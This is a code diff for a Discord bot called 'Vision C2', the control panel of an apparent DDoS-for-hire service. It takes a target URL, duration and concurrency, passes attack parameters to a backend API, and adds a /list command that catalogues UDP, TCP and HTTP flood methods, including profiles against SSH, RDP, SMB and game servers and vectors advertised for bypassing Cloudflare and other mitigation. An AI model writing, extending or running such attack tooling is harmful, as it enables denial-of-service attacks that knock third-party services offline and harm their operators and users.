@@ -96,7 +96,6 @@ class L7Modal(discord.ui.Modal, title="Vision C2: L7 Dispatch"):
         self.url = discord.ui.TextInput(label="Target URL", placeholder="https://example.com", required=True)
         self.time = discord.ui.TextInput(label="Duration (Seconds)", placeholder="60", required=True)
         self.concurrents = discord.ui.TextInput(label="Concurrents", placeholder="1", required=True)
-        # Accorpiamo i parametri per non superare il limite di 5 campi
         self.advanced_config = discord.ui.TextInput(
             label="Method | HTTP Ver | Rate Limit", 
             placeholder="GET | 2 | 500", 
@@ -110,7 +109,6 @@ class L7Modal(discord.ui.Modal, title="Vision C2: L7 Dispatch"):
         self.add_item(self.advanced_config)
 
     async def on_submit(self, interaction: discord.Interaction):
-        # Parsing dei parametri avanzati
         try:
             parts = [p.strip() for p in self.advanced_config.value.split("|")]
             req_m = parts[0] if len(parts) > 0 else "GET"
@@ -133,8 +131,8 @@ class L7Modal(discord.ui.Modal, title="Vision C2: L7 Dispatch"):
 class L7MethodSelect(discord.ui.Select):
     def __init__(self):
         options = [
-            discord.SelectOption(label="HTTP-FULL", description="Standard Layer 7 Flood", emoji="🌐"),
-            discord.SelectOption(label="HTTP-CONNECT", description="Proxied Connection Flood", emoji="🔗"),
+            discord.SelectOption(label="HTTP-FULL", description="Advanced Chrome Flooder + Cookie Support", emoji="🌐"),
+            discord.SelectOption(label="HTTP-CONNECT", description="Cloudflare/Mitigation Bypass Vector", emoji="🔗"),
         ]
         super().__init__(placeholder="Select L7 Attack Method...", options=options)
 
@@ -230,7 +228,6 @@ async def handle_api_call(interaction: discord.Interaction, params):
         "time": req_time, "method": params['method'], "concurrent": req_concurrents
     }
     
-    # Optional parameters handling
     for key in ['profile', 'payload', 'requestmethod', 'http', 'ratelimit']:
         if params.get(key): api_params[key] = params[key]
 
@@ -298,6 +295,38 @@ async def attack_hub(interaction: discord.Interaction):
     embed.add_field(name="📊 Your Plan Status", value=f"**Concurrents:** `{concurrents}`\n**Max Duration:** `{max_time}s`", inline=False)
     embed.set_footer(text="Vision Command Unit | Authorized Personnel Only")
     await interaction.response.send_message(embed=embed, view=AttackHubView(concurrents, max_time), ephemeral=False)
+
+@client.tree.command(name="list", description="Display available Vision Methods")
+async def list_methods(interaction: discord.Interaction):
+    embed = discord.Embed(title="🛰️ Vision Methods", color=0x00f2ff)
+    
+    # Layer 4 (UDP)
+    udp_desc = (
+        "**UDP-APP:** Gaming/Communication custom payload flood.\n"
+        "└ *Profiles:* `RAKNET`, `A2S`, `QUAKE`, `SAMP`, `OPENVPN`, `TS3`, `DISCORD`, `ENET`\n"
+        "**UDP-BIG:** High-bandwidth volumetric attack (Large packets).\n"
+        "**UDP-PPS:** High Packets-Per-Second CPU/Kernel overwhelm."
+    )
+    embed.add_field(name="🌐 Layer 4 (UDP)", value=udp_desc, inline=False)
+    
+    # Layer 4 (TCP)
+    tcp_desc = (
+        "**TCP-APP:** Protocol-specific TCP application layer attack.\n"
+        "└ *Profiles:* `SSH`, `FTP`, `SMTP`, `IMAP`, `POP3`, `TELNET`, `LDAP`, `RDP`, `SMB`, `MYSQL`, `POSTGRESQL`, `IRC`, `BGP`, `FIVEM`, `MCJE`\n"
+        "**TCP-CONNECT:** Stateful handshake flood with PSH/ACK payloads.\n"
+        "**TCP-FULL:** Pure Handshake Kernel Built (No Mitigation).\n"
+        "**TCP-OUR:** TLS Handshakes + Out-of-order PSH/ACK."
+    )
+    embed.add_field(name="🔒 Layer 4 (TCP)", value=tcp_desc, inline=False)
+    
+    # Layer 7 (HTTP)
+    l7_desc = (
+        "**HTTP-FULL:** Advanced Chrome flooder with cookie jars & adaptive rate limiting.\n"
+        "**HTTP-CONNECT:** Proxy-based tunnel flood for Cloudflare & DDoS protection bypass."
+    )
+    embed.add_field(name="🔥 Layer 7 (HTTP)", value=l7_desc, inline=False)
+    
+    await interaction.response.send_message(embed=embed)
 
 if __name__ == "__main__":
     if BOT_TOKEN: client.run(BOT_TOKEN)
